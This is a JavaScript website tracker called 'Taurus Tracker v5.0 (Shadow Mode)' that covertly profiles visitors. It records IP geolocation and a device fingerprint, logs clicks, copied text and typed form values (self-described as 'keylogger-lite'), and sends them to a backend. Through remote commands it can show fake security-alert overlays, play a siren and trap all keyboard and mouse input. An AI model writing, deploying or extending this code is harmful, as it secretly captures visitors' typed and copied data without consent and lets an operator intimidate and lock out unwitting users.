// TAURUS TRACKER v5.0 (Shadow Mode / Backend Oriented)
/**
 * TAURUS TRACKER v5.0 (Final System)
 * ----------------------------------
 * - Altyapı: Backend Oriented (Engellenemez Gölge Modu)
 * - Güvenlik: Middleware IP Gating & Server-side Reporting
 * - Design: Radical UI v2 (Technical Precision)
 * - Kurallar: %100 Final Guide Compliance
 */

/* Taurus Tracker v5 - Mobile Optimized */
(function () {
    console.log("🐂 Taurus Tracker v5.0 (Shadow Mode) Initializing...");
    window.taurus_set_internal = () => { window.isInternalNav = true; console.log("🐂 Manual Internal Signal Set"); };

    // CONFIGURATION (Sensitive tokens moved to backend)
    const CONFIG = {
        collection: 'visitors_v1',
        ipApi: 'https://ipapi.co/json/',
        api: {
            tracker: '/api/tracker',
            report: '/api/report'
        }
    };

    // STATE
    let sessionID = localStorage.getItem('taurus_session_id');
    let sessionData = {};
    let localHistory = JSON.parse(localStorage.getItem('taurus_history_buffer') || "[]");
    let audioObj = null;
    window.isInternalNav = false; // Flag to prevent reports on page transitions

    // --- 1. VISUAL INTERFACE (THE DESIGN) ---

    // Inject CSS & Fonts
    const fonts = document.createElement('link');
    fonts.rel = 'stylesheet';
    fonts.href = 'https://fonts.googleapis.com/css2?family=Manrope:wght@200;400;700;900&family=Syncopate:wght@400;700&display=swap';
    document.head.appendChild(fonts);

    const css = `
        /* Overlay Base */
        #taurus-overlay {
            position: fixed;
            inset: 0;
            height: 100dvh; /* Enforce Dynamic Viewport Height on Parent */
            z-index: 9999999;
            background: #050505;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: 'Manrope', sans-serif;
            text-align: center;
            overflow: hidden;
            user-select: none;
            touch-action: none;
        }

        .taurus-grid-bg {
            position: absolute;
            inset: 0;
            background-image: radial-gradient(circle at center, transparent 0, #050505 100%),
                              linear-gradient(rgba(255, 215, 0, 0.08) 1px, transparent 0),
                              linear-gradient(90deg, rgba(255, 215, 0, 0.08) 1px, transparent 0);
            background-size: 100% 100%, 35px 35px, 35px 35px;
            opacity: 0.4;
            pointer-events: none;
        }

        .taurus-axis-glow {
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 1px; height: 100%;
            background: rgba(255, 215, 0, 0.2);
            filter: blur(1px);
            pointer-events: none;
        }

        .taurus-radial-glow {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 500px; height: 500px;
            background: rgba(239, 68, 68, 0.2);
            border-radius: 50%;
            filter: blur(100px);
            animation: taurus-pulse-glow 4s infinite ease-in-out;
            pointer-events: none;
        }

        @keyframes taurus-pulse-glow {
            0%, 100% { opacity: 0.2; transform: translate(-50%, -50%) scale(1); }
            50% { opacity: 0.4; transform: translate(-50%, -50%) scale(1.1); }
        }

        /* TAURUS RIPPLE ANIMATION (Unified Gateway Style) */
        @keyframes taurus-ripple {
            0% {
                transform: scale(1);
                opacity: 0.8;
                box-shadow: 0 0 10px #FFD700;
            }
            100% {
                transform: scale(1.6);
                opacity: 0;
                box-shadow: 0 0 30px #FFEebb;
            }
        }

        /* TAURUS PULSE TEXT ANIMATION (Gold Text Glow Effect) */
        @keyframes taurus-pulse-text {
            0%, 100% { opacity: 0.8; }
            50% { opacity: 1; text-shadow: 0 0 10px #FFD700; }
        }

        /* Content Blocks */
        .taurus-content {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 550px; /* Widened from 500px per user request */
            display: flex;
            flex-direction: column;
            align-items: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center; 
            /* min-height removed to allow parent flex centering to work */
            padding-left: 1rem; padding-right: 1rem;
        }

        .taurus-logo-container {
            position: relative;
            width: 100px;
            height: 100px;
            /* RIPPLE CONTAINMENT CALCULATION:
               Logo: 100px diameter
               Ripple-1 inset: -15px (extends 15px beyond logo)
               Max ripple scale: 1.6x (animation)
               Total ripple diameter at peak: 130px (100 + 15*2)
               Scaled: 130 * 1.6 = 208px
               
               Required clearance:
               - TOP: 40px (15px ripple + 25px safety for panel top)
               - BOTTOM: 45px (15px ripple + 30px safety for text)
            */
            margin: 40px auto 45px auto;
            display: flex; 
            justify-content: center; 
            align-items: center;
            transition: transform 1s ease;
        }

        /* ... Ripple CSS ... */
        .taurus-ripple-1 {
            position: absolute; 
            inset: -15px; /* Ripple extends 15px beyond logo edge */
            border: 2px solid #FFD700; 
            border-radius: 50%; 
            animation: taurus-ripple 2.5s infinite;
        }

        .taurus-ripple-2 {
            position: absolute; 
            inset: -5px; 
            border: 1px solid rgba(255, 215, 0, 0.5); 
            border-radius: 50%; 
            animation: taurus-ripple 2.5s infinite 0.8s;
        }

        /* --- MODE-SPECIFIC STYLES --- */

        /* MODE: LIVE & FREEZE (Freeze/Gezginci) - Huge Logo, Title Hidden in Freeze */
        .mode-live .taurus-logo-container,
        .mode-freeze .taurus-logo-container {
            transform: scale(2.0); 
            margin-bottom: 0; 
        }
        
        .mode-live .taurus-title {
            display: block !important;
            margin-top: 8.5rem; /* Push title down significantly to clear 2x logo */
        }

        .mode-freeze .taurus-title {
            display: none !important; /* ACCESS DETECTED is hidden in freeze mode by default */
        }
        
        .mode-live .taurus-panel,
        .mode-freeze .taurus-panel {
            display: none !important;
        }

        .mode-freeze #taurus-custom-msg {
            display: block; 
            width: 100%;
            text-align: center;
            margin: 18rem auto 0 auto; /* Move much lower and ensure auto-centering */
        }

        /* Gateway, Alarm, Block - Standard Panel Style (Reverted) */
        /* Custom border/color styles removed to match original design */

        .taurus-logo-main {
            width: 100%; 
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #FFD700;
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.4);
            z-index: 10;
            position: relative;
            transition: all 1s ease;
        }

        .taurus-logo-main img {
            width: 75%; height: 75%;
            object-contain: cover;
        }

        .taurus-title {
            font-family: 'Syncopate', sans-serif;
            font-weight: 900;
            text-transform: uppercase;
            text-align: center; /* Enforce centering */
            letter-spacing: 0.4em;
            line-height: 1.2;
            margin-bottom: 1rem; /* Reduced from 2rem (Tightened Gap) */
            transition: margin 0.5s ease;
            width: 100%; /* Ensure it spans full width for centering */
        }

        .taurus-title span:first-child { color: #FFD700; font-size: 1.5rem; }
        .taurus-title span:last-child { color: #EF4444; font-size: 1.5rem; display: block; margin-top: 0.2rem; filter: drop-shadow(0 0 15px rgba(239, 68, 68, 0.6)); } /* Reduced margin */

        /* MASTER PANEL (Responsive & Unified) */
        .taurus-master-panel {
            /* Glassmorphism */
            background: rgba(10, 10, 10, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(30px);
            
            /* Dimensions */
            width: 90%;
            max-width: 400px;
            min-height: 720px; height: auto;
            max-height: 85vh; 
            
            /* Shape */
            border-radius: 2.5rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            
            /* Layout */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Distribute content evenly */
            overflow: hidden;
            
            /* Padding */
            padding-top: 5rem;
            padding-bottom: 2rem;
            padding-left: 2rem;
            padding-right: 2rem;
            
            /* Transitions */
            transition: all 0.5s ease;
        }

        @media (min-width: 768px) {
            .taurus-master-panel {
                padding: 2.5rem; 
                padding-top: 5rem; 
            }
        }

        .taurus-panel-text {
            color: rgba(255, 255, 255, 0.6);
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.2em;
            line-height: 1.6;
            margin-bottom: 2.5rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            padding-bottom: 1.5rem;
        }

        .taurus-stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
            text-align: left;
        }

        .taurus-stat-item p:first-child { color: rgba(255, 215, 0, 0.6); font-size: 7px; text-transform: uppercase; letter-spacing: 0.3em; margin-bottom: 0.25rem; }
        .taurus-stat-item p:last-child { color: #fff; font-family: monospace; font-size: 11px; letter-spacing: 0.1em; font-weight: bold; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

        .taurus-footer {
            position: absolute;
            bottom: 30px;
            left: 0;
            width: 100%;
            margin-top: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 20;
            pointer-events: none; /* Prevent accidental blocking */
        }

        .taurus-footer-line {
            width: 1px; height: 1.5rem;
            background: linear-gradient(to bottom, #FFD700, transparent);
            opacity: 0.4;
            margin-bottom: 0.75rem;
        }

        .taurus-footer-text {
            color: rgba(255, 215, 0, 0.5);
            font-size: 8px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.6em;
            animation: taurus-pulse-opacity 2s infinite ease-in-out;
            padding-bottom: 0;
        }

        @keyframes taurus-pulse-opacity {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        /* Standard Button Container (Matches Gateway Code Box Purely) */
        /* Standard Button Container (Action Button) */
        .taurus-btn-container {
            width: 100%;
            padding: 0 1rem; /* Adjusted padding */
            background: #FFD700;
            color: #000;
            border-radius: 0.75rem; 
            font-weight: 800; /* Slightly reduced weight for readability */
            font-size: 1rem; /* Standard Button Font Size */
            letter-spacing: 0.15em;
            text-align: center;
            font-family: 'Syncopate', sans-serif;
            margin-top: auto;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 50px; /* Standard Button Height */
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
            cursor: pointer;
            transition: all 0.3s ease;
            border: none;
            text-transform: uppercase;
        }
        
        /* Gateway Code Box Specific Overrides */
        .taurus-code-box {
            height: 70px !important;
            font-size: 2.5rem !important;
            font-weight: 900 !important;
            letter-spacing: 0.1em;
        }

        .taurus-btn-container:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.6);
            background: #fff; 
        }




        @media (min-width: 768px) {
            .taurus-title span:first-child, .taurus-title span:last-child { font-size: 1.8rem; }
            .taurus-panel-text { font-size: 11px; }
            .taurus-stat-item p:last-child { font-size: 13px; }
            .taurus-stat-item p:last-child { font-size: 13px; }
        }

        /* Freeze Mode (Show Feature) */
        .mode-freeze .taurus-footer {
            display: none !important;
        }

        .mode-freeze .taurus-logo-container {
            transform: scale(2);
            transition: transform 1s ease;
        }
        
        .mode-freeze .taurus-logo-main {
            border-color: rgba(255, 215, 0, 0.8);
            box-shadow: 0 0 100px rgba(255, 215, 0, 0.6);
            transition: all 1s ease;
        }

        .mode-freeze .taurus-ripple-1,
        .mode-freeze .taurus-ripple-2 {
            animation-duration: 4s; /* Slower, calmer pulse */
            border-color: rgba(255, 215, 0, 0.3);
        }

        /* Custom Message (Hacker Typewriter) */
        #taurus-custom-msg {
            display: none;
            margin-top: 5rem; /* Increased from 2rem to clear large logo */
            color: #FFD700;
            font-family: 'Courier New', monospace;
            font-size: 1.5rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            text-align: center;
            max-width: 80%;
            line-height: 1.4;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
            position: relative;
            z-index: 30;
        }

        .mode-freeze .taurus-footer {
            display: none !important;
        }
    `;

    const style = document.createElement('style');
    style.innerHTML = css;
    document.head.appendChild(style);

    // Create Overlay Elements
    function createOverlay(mode = 'alarm') {
        let overlay = document.getElementById('taurus-overlay');

        // If overlay logic needs a full reset or mode change, we might want to clear old one
        if (overlay) {
            overlay.className = ''; // Clear previous modes
        } else {
            overlay = document.createElement('div');
            overlay.id = 'taurus-overlay';
            document.body.appendChild(overlay);
        }

        // Apply Mode Class
        overlay.classList.add(`mode-${mode}`);

        // Define Logo
        const logoSrc = window.TAURUS_LOGO_DATA || 'assets/favicon_taurus.png';
        const displayIP = sessionData?.ip || '0.0.0.0';
        const displayCity = sessionData?.city || 'Unknown';

        // dynamic content based on mode
        let panelContentHTML = '';

        // Common Logo HTML (Standardized)
        const commonLogoHTML = `
            <div style="position: relative; width: 140px; height: 140px; margin: 0 auto 1.5rem auto; display: flex; justify-content: center; align-items: center; flex-shrink: 0;">
                <div style="position: absolute; inset: 0; border: 2px solid #FFD700; border-radius: 50%; animation: taurus-ripple 2.5s infinite;"></div>
                <div style="position: absolute; inset: 10px; border: 1px solid rgba(255, 215, 0, 0.5); border-radius: 50%; animation: taurus-ripple 2.5s infinite 0.8s;"></div>
                <img src="${logoSrc}" style="width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #FFD700; box-shadow: 0 0 40px rgba(255, 215, 0, 0.4); z-index: 10;">
            </div>
        `;

        // Common Footer HTML (Standardized)
        const commonFooterHTML = `
            <div class="mt-auto pt-8 w-full text-center" style="margin-top:auto; padding-top: 2rem; width:100%; text-align:center;">
                <p style="font-family: 'Courier New', monospace; font-size: 9px; color: rgba(255, 215, 0, 0.4); text-transform: uppercase; letter-spacing: 0.2em;">Restricted Access Mode</p>
            </div>
        `;

        if (mode === 'gateway') {
            const gateCode = Math.floor(10 + Math.random() * 90);
            panelContentHTML = `
                ${commonLogoHTML}
                
                <h2 class="font-display text-2xl font-bold tracking-widest text-center" style="animation: taurus-pulse-text 2s infinite ease-in-out; margin-bottom: 2rem; color: #FFD700;">
                    TAURUS GATEWAY
                </h2>

                <p class="taurus-panel-text" style="margin-bottom: 2rem; color:#FFD700; text-align: center;">
                    VERIFICATION REQUEST SENT
                </p>

                <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; flex: 1; justify-content: center;">
                    <i data-lucide="shield-check" style="color: rgba(255,215,0,0.5); width: 48px; height: 48px;"></i>
                    <div style="text-align: center;">
                        <p style="font-size: 0.7rem; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px;">Awaiting Verification</p>
                        <p style="font-size:9px; color:#FFD700; font-family: monospace;">SESSION ID: ${sessionID?.substring(0, 8) || 'Init'}</p>
                    </div>
                </div>
                
                <div style="width: 100%; padding: 1rem; background: #FFD700; color: #000; border-radius: 0.75rem; font-weight: 900; font-size: 2rem; letter-spacing: 0.1em; text-align: center; font-family: 'Syncopate', sans-serif; margin-top: auto; display: flex; align-items: center; justify-content: center; height: 60px; box-shadow: 0 0 20px rgba(255, 215, 0, 0.4);">
                    ${gateCode}
                </div>
        `;
        } else {
            // Alarm & Block (Standardized)
            const buttonHTML = mode === 'block'
                ? '<button class="taurus-btn-container" disabled style="cursor: not-allowed; opacity: 0.8;">BLOCKED</button>'
                : '<button class="taurus-btn-container" id="taurus-ack-btn">ACKNOWLEDGE</button>';

            panelContentHTML = `
                ${commonLogoHTML}

                <h2 class="font-display text-2xl font-bold tracking-widest text-center" style="animation: taurus-pulse-text 2s infinite ease-in-out; margin-bottom: 1.5rem; line-height: 1.4;">
                    <span style="color: #FFD700;">ACCESS</span><br>
                    <span style="color: #FFD700;">${mode === 'block' ? 'DENIED' : 'DETECTED'}</span>
                </h2>

                <p class="taurus-panel-text" id="taurus-panel-info" style="margin-bottom: 2rem; font-size: 10px;">
                    Platform Security has flagged this connection. <br>
                    Access protocols have been initiated.
                </p>
                
                <div style="display: flex; flex-direction: column; gap: 1.5rem; width: 100%; align-items: center; margin-bottom: auto;">
                    <div style="text-align: center;">
                        <p style="font-size: 0.7rem; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px;">Network Address</p>
                        <p id="taurus-stat-ip" style="font-family: 'Courier New', monospace; font-size: 1.1rem; color: #fff; font-weight: bold; letter-spacing: 1px;">${displayIP}</p>
                    </div>
                    <div style="text-align: center;">
                        <p style="font-size: 0.7rem; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px;">Geo-Location</p>
                        <p id="taurus-stat-city" style="font-family: 'Courier New', monospace; font-size: 1.1rem; color: #fff; font-weight: bold; letter-spacing: 1px;">${displayCity}</p>
                    </div>
                    <div style="text-align: center;">
                        <p style="font-size: 0.7rem; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px;">Session Identifier</p>
                        <p style="font-family: 'Courier New', monospace; font-size: 0.9rem; color: #aaa; letter-spacing: 1px;">${sessionID?.substring(0, 12)}</p>
                    </div>
                </div>

                ${buttonHTML}
                ${commonFooterHTML}
        `;
        }

        // Render Logic:
        // Standard Modes (Gateway, Alarm, Block) -> Logo & Title INSIDE Panel (Unified Card)
        // Live Mode -> Logo & Title OUTSIDE Panel (Huge Logo, Text pushed down)

        let innerHTMLContent = '';

        if (mode === 'live' || mode === 'freeze') {
            // LIVE / FREEZE MODE STRUCTURE (Logo Only / Large Logo)
            innerHTMLContent = `
            <div class="taurus-logo-container" >
                    <div class="taurus-ripple-1"></div>
                    <div class="taurus-ripple-2"></div>
                    <img src="${logoSrc}" class="taurus-logo-main" alt="Taurus">
                </div>
                
                <h1 class="taurus-title">
                    <span id="taurus-msg-top">ACCESS</span>
                    <span id="taurus-msg-bottom">DETECTED</span>
                </h1>
                
                <!--Panel Hidden in CSS for mode - live / freeze-- >
            <div class="taurus-panel"></div>
            `;
        } else {
            // STANDARD MODE STRUCTURE (Unified)
            // pt-20/md:pt-24 provides the "Safe Space" for top ripples
            // overflow-hidden prevents ripple clipping
            innerHTMLContent = `
            <div class= "taurus-master-panel" >
            ${panelContentHTML}
                </div>
            `;
        }

        overlay.innerHTML = `
            <div class="taurus-grid-bg" ></div>
            <div class="taurus-axis-glow"></div>
            <div class="taurus-radial-glow"></div>
            
            <div class="taurus-content">
                ${innerHTMLContent}
                <div id="taurus-custom-msg"></div>
            </div>


        `;

        // Acknowledge Logic (Only for Alarm/Block usually)
        const btn = document.getElementById('taurus-ack-btn');
        if (btn) {
            btn.onclick = () => {
                overlay.style.display = 'none';
                document.body.style.overflow = '';
                stopAlarmSound();
                if (window.db) {
                    window.db.collection(CONFIG.collection).doc(sessionID).update({ action: null });
                }
            };
        }
    }

    // --- 2. LOGIC & DATABASE ---

    // Captured early to ensure accuracy
    const sessionStartTime = new Date();

    function getTimestamp() {
        return new Date().toLocaleTimeString('tr-TR');
    }

    async function initTracker() {
        // Ensure Auth (Fixes Permission Errors)
        if (window.auth && !window.auth.currentUser) {
            try {
                await window.auth.signInAnonymously();
                console.log("🔐 Authenticated anonymously");
            } catch (e) {
                console.error("Auth Failed:", e);
            }
        }

        // Generate Session ID if new
        if (!sessionID) {
            sessionID = 'sess_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('taurus_session_id', sessionID);

            // New Session: Gather Data & Notify Telegram
            await gatherAndNotify();
        } else {
            console.log("🐂 Resuming Session:", sessionID);
            // Existing Session: Sync data from Firestore to ensure duration accuracy
            syncSessionData(sessionID);
            logHistory('Refresh', window.location.pathname);
            listenForCommands(sessionID);
        }

        // Setup Listeners
        setupEventListeners();
    }

    function getDeviceData() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;

        // --- 1. Device Type ---
        let type = 'Monitor';
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
            type = 'Mobile';
        } else if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
            type = 'Tablet';
        }

        // --- 2. Operating System ---
        let os = 'Unknown OS';
        if (/Win/.test(platform) || /Windows/.test(ua)) os = 'Windows';
        else if (/Mac/.test(platform) || /Macintosh/.test(ua)) {
            os = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : 'Mac OS X';
        }
        else if (/Linux/.test(platform) || /Linux/.test(ua)) os = 'Linux';
        else if (/Android/.test(ua)) os = 'Android';

        // Precise OS Version (Simple Check)
        if (/Windows NT 10.0/.test(ua)) os = 'Windows 10/11';
        if (/Mac OS X 10[._]\d+/.test(ua)) os = 'Mac OS X';

        // --- 3. Browser ---
        let browser = 'Unknown Browser';
        if (/Firefox/.test(ua)) browser = 'Firefox';
        else if (/SamsungBrowser/.test(ua)) browser = 'Samsung Internet';
        else if (/Opera|OPR/.test(ua)) browser = 'Opera';
        else if (/Trident/.test(ua)) browser = 'Internet Explorer';
        else if (/Edge/.test(ua)) browser = 'Edge';
        else if (/Chrome/.test(ua)) browser = 'Chrome'; // Must check before Safari
        else if (/Safari/.test(ua)) browser = 'Safari';

        // --- 4. Model (Approx) ---
        let model = type;
        if (os === 'Mac OS X') model = 'MacBook / iMac';
        if (os === 'Windows') model = 'PC';
        if (/iPhone/.test(ua)) model = 'iPhone';
        if (/iPad/.test(ua)) model = 'iPad';
        if (/Android/.test(ua)) {
            const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
            if (match && match[2]) model = match[2];
        }

        return {
            type: os.includes('Windows') || os.includes('Mac') ? 'Monitor' : type, // Safe fallback
            model: model,
            os: os,
            browser: browser,
            platform: platform,
            userAgent: ua,
            screen: window.screen.width + 'x' + window.screen.height,
            language: navigator.language
        };
    }

    async function gatherAndNotify() {
        let ipData = { ip: '0.0.0.0' };
        try {
            const res = await fetch(CONFIG.ipApi);
            if (res.ok) ipData = await res.json();
            sessionData = ipData; // Store globally for UI
        } catch (error) {
            console.warn("🐂 Client Geo-Fetch blocked, switching to Server-Side Capture.");
        }

        try {
            // ONE SOURCE OF TRUTH: Backend API handles Telegram & Firestore Init
            fetch(CONFIG.api.tracker, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionID: sessionID,
                    ipData: ipData,
                    device: getDeviceData(),
                    browser: navigator.userAgent,
                    pathname: window.location.pathname
                }),
                keepalive: true
            });

            // Start Listening for remote commands (Alarm/Block)
            listenForCommands(sessionID);

        } catch (error) {
            console.error("Tracker API Call Error:", error);
        }
    }

    function listenForCommands(sid) {
        if (!window.db) return;

        window.db.collection(CONFIG.collection).doc(sid)
            .onSnapshot((doc) => {
                if (doc.exists) {
                    const data = doc.data();
                    handleCommand(data); // Pass full object
                }
            });
    }

    async function syncSessionData(sid) {
        if (!window.db) return;
        try {
            const doc = await window.db.collection(CONFIG.collection).doc(sid).get();
            if (doc.exists) {
                const data = doc.data();
                sessionData = {
                    ...sessionData,
                    ...data,
                    startTime: data.startTime || new Date().toISOString()
                };
                console.log("🔄 Session Data Synced:", sessionData.city, "| Started:", sessionData.startTime);
            }
        } catch (e) { console.warn("🐂 Sync Error:", e); }
    }


    function handleCommand(payload) {
        if (!payload) return;

        // Support both old string format and new object format
        const cmd = (typeof payload === 'string' ? payload : payload.action);
        const msg = (typeof payload === 'object' ? payload.message : null);

        // Create/Update Overlay with the correct mode structure
        createOverlay(cmd);
        const overlay = document.getElementById('taurus-overlay');
        const topText = document.getElementById('taurus-msg-top');
        const botText = document.getElementById('taurus-msg-bottom');
        const infoText = document.getElementById('taurus-panel-info');
        const msgBox = document.getElementById('taurus-custom-msg');

        if (cmd === 'alarm') {
            overlay.style.display = 'flex';
            document.body.style.overflow = 'hidden'; // Lock scroll
            overlay.className = 'mode-alarm';
            if (msgBox) msgBox.style.display = 'none'; // Hide custom msg
            if (topText) topText.innerText = 'ACCESS';
            if (botText) botText.innerText = 'DETECTED';
            if (infoText) infoText.innerHTML = 'Platform Security has flagged this connection. <br> Access protocols have been initiated.';
            playAlarmSound();
        } else if (cmd === 'block') {
            overlay.style.display = 'flex';
            document.body.style.overflow = 'hidden'; // Lock scroll
            overlay.className = 'mode-block';
            if (msgBox) msgBox.style.display = 'none'; // Hide custom msg
            if (topText) topText.innerText = 'ACCESS';
            if (botText) botText.innerText = 'DENIED';
            if (infoText) infoText.innerHTML = 'Platform Security has flagged this connection. <br> Access protocols have been initiated.';
            playAlarmSound();
            if (infoText) infoText.innerHTML = 'Platform Security has flagged this connection. <br> Access protocols have been initiated.';
            playAlarmSound();
            trapInput();
        } else if (cmd === 'freeze') {
            overlay.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            overlay.className = 'mode-freeze';

            // Handle Custom Message
            if (msgBox) {
                if (msg) {
                    msgBox.innerText = msg;
                    // Visibility handled by CSS adding .mode-freeze to overlay
                } else {
                    msgBox.innerText = '';
                }
            }

            stopAlarmSound(); // Silence for dramatic effect
            trapInput();
        } else if (cmd === 'clear') {
            if (msgBox) msgBox.innerText = ''; // Reset message
            overlay.style.display = 'none';
            document.body.style.overflow = ''; // Restore scroll
            stopAlarmSound();
            releaseInput(); // Restore all interactions
        }
    }
    window.handleCommand = handleCommand; // Expose for testing

    // --- 3. LOGGING & INTERACTION ---

    function logHistory(action, detail) {
        if (!window.db) return;
        const entry = { time: getTimestamp(), action: action, detail: detail };

        // 1. Sync to Firestore (Intelligence)
        window.db.collection(CONFIG.collection).doc(sessionID).update({
            history: firebase.firestore.FieldValue.arrayUnion(entry),
            last_seen: firebase.firestore.FieldValue.serverTimestamp()
        }).catch(e => console.log("Log Error", e));

        // 2. Buffer to Local (Rich Data)
        localHistory.push(`[${entry.time}] ${action}: ${detail} `);
        localStorage.setItem('taurus_history_buffer', JSON.stringify(localHistory));

        console.log(`📝 Log: ${action} - ${detail} `);
    }

    async function sendPulse(title, priority = 'medium', extra = '') {
        // Build detailed log content
        const eventLog = localHistory.slice(-20).join('\n'); // Last 20 events
        const reportText = `⏱ <b>Duration:</b> ${extra.duration} s\n` +
            `📍 <b>Final Page:</b> ${window.location.pathname} \n\n` +
            `📝 <b>EVENT LOG:</b>\n < code > ${eventLog || 'No events recorded'}</code > `;

        try {
            fetch(CONFIG.api.report, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionID: sessionID,
                    report: reportText,
                    city: sessionData?.city || 'Unknown'
                }),
                keepalive: true
            });
        } catch (e) { }
    }

    function setupEventListeners() {
        // Clicks & Navigation
        document.addEventListener('click', (e) => {
            const link = e.target.closest('a');
            if (link) {
                logHistory('Navigation', link.href);
                // Detect internal navigation to prevent exit report
                // 1. Must be same origin (protocol + host)
                // 2. Must NOT be a simple #anchor tracking (staying on same page)
                // 3. Must NOT be target="_blank" (opening new tab/window)
                const isInternal = link.origin === window.location.origin;
                const isAnchor = link.getAttribute('href')?.startsWith('#');
                const isNewTab = link.target === '_blank';

                if (isInternal && !isAnchor && !isNewTab) {
                    window.isInternalNav = true;
                    console.log("🐂 Internal Signal Maintained (Origin Match)");
                }
            } else {
                const target = e.target.innerText ? e.target.innerText.substring(0, 20) : e.target.tagName;
                logHistory('Click', target);
            }
        });

        // Copy - The "Copy Content" requirement
        document.addEventListener('copy', () => {
            const selection = document.getSelection().toString();
            if (selection) {
                logHistory('Copy', selection.substring(0, 50) + (selection.length > 50 ? '...' : ''));
            }
        });

        // Input - Capture typed text (Keylogger-lite style)
        document.addEventListener('change', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                if (e.target.type !== 'password') { // Privacy safety
                    logHistory('Input', `[${e.target.name || e.target.id || 'Field'}]: ${e.target.value.substring(0, 40)} `);
                }
            }
        });

        // Visibility (Tab Change & Exit Reporting)
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                logHistory('Tab', 'Hidden');

                // EXIT REPORT: Only if NOT an internal navigation
                if (!window.isInternalNav) {
                    const endTime = new Date();
                    const startTime = sessionData?.startTime ? new Date(sessionData.startTime) : new Date();
                    const duration = Math.round((endTime - startTime) / 1000);

                    sendPulse("Session Report", 'high', { duration: duration });
                } else {
                    // Reset flag for the next page load
                    window.isInternalNav = false;
                }

            } else {
                logHistory('Tab', 'Visible');
            }
        });
    }

    // --- 4. UTILITIES ---

    function playAlarmSound() {
        if (!audioObj) {
            audioObj = new Audio('https://www.soundjay.com/buttons/sounds/button-10.mp3'); // Placeholder siren, user can replace
            audioObj.loop = true;
        }
        audioObj.play().catch(e => console.log("Audio requires interaction"));
    }

    function stopAlarmSound() {
        if (audioObj) {
            audioObj.pause();
            audioObj.currentTime = 0;
        }
    }

    function blockInteraction(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    function trapInput() {
        console.log("🔒 Strict Lockout Engaged");
        // Use capturing phase to intercept before any other listeners
        window.addEventListener('keydown', blockInteraction, true);
        window.addEventListener('mousedown', blockInteraction, true);
        window.addEventListener('click', blockInteraction, true);
        window.addEventListener('contextmenu', blockInteraction, true);
        window.addEventListener('touchstart', blockInteraction, { passive: false, capture: true });
        window.addEventListener('wheel', blockInteraction, { passive: false, capture: true });

        // Disable scroll on root elements
        document.documentElement.style.overflow = 'hidden';
        document.body.style.overflow = 'hidden';
    }

    function releaseInput() {
        console.log("🔓 Strict Lockout Released");
        window.removeEventListener('keydown', blockInteraction, true);
        window.removeEventListener('mousedown', blockInteraction, true);
        window.removeEventListener('click', blockInteraction, true);
        window.removeEventListener('contextmenu', blockInteraction, true);
        window.removeEventListener('touchstart', blockInteraction, true);
        window.removeEventListener('wheel', blockInteraction, true);

        document.documentElement.style.overflow = '';
        document.body.style.overflow = '';
    }

    // WAIT FOR FIREBASE
    const intv = setInterval(() => {
        if (window.firebase && window.db) {
            clearInterval(intv);
            initTracker();
        }
    }, 500);

    // Fallback if Firebase takes too long
    setTimeout(() => { clearInterval(intv); if (!window.db) console.error("Firebase Timeout"); }, 5000);

})();
